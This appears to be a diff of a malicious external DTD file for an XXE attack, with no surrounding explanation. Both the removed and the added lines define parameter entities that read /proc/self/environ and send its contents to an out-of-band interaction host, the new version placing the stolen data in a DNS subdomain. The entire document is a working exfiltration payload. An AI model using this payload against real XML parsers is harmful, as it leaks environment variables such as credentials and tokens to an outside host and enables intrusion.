@@ -1,3 +1,4 @@
 <!ENTITY % file SYSTEM "file:///proc/self/environ">
-<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://smntukqjiftepwtcgbewu3pit99fvy68d.oast.fun/leak?q=%file;'>">
-%all;
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.smntukqjiftepwtcgbewu3pit99fvy68d.oast.fun/'>">
+%eval;
+%exfil;
